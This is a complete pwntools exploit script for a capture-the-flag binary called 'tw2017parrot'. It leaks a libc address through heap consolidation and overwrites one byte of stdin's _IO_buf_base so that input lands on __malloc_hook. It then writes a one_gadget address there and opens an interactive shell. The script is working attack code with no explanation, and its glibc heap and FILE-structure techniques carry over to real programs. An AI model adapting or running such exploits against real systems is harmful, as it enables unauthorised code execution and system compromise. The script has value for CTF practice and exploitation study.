from pwn import *

def malloc(size, content):
	p.sendlineafter('Size:\n', str(size))
	p.sendafter('Buffer:\n', str(content))
	

p = process('./tw2017parrot')
e = ELF('./tw2017parrot')
l = e.libc

context.log_level = "debug"

pause()
### libc leak
malloc(24,'a' *24)
malloc(50, 'a')
malloc(200, 'a') # malloc_consolidate() -> libc addr

malloc(16, 'a' * 8)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = libc - 88 - 16 - l.sym['__malloc_hook']
log.success('libc addr : ' + hex(libc))
log.info('system : ' + hex(libc + l.sym['system']))
log.info('__malloc_hook : ' + hex(libc + l.sym['__malloc_hook']))
log.info('main_arena : ' + hex(libc + l.sym['__malloc_hook'] + 16))
#############

## stdin -> _IO_buf_base overwrite 1byte
malloc(libc + l.sym['_IO_2_1_stdin_'] + 8 * 7 + 1, 'a')

##########################
#### overwrite _IO_buf_base & _IO_buf_end
payload = ''
payload += '1'.ljust(0x18, '\x00')
payload += p64(libc + l.sym['__malloc_hook'])
payload += p64(libc + l.sym['__malloc_hook'] + 0x40)
payload += p64(0) * 8

malloc(payload, '')
##########################
###flush old buffer
for i in range(94):
	p.sendafter('Buffer:\n', '\n')
##########################
#### __malloc_hook -> one_gadget or system
p.sendline(p64(libc + 0xf02a4))

p.interactive()
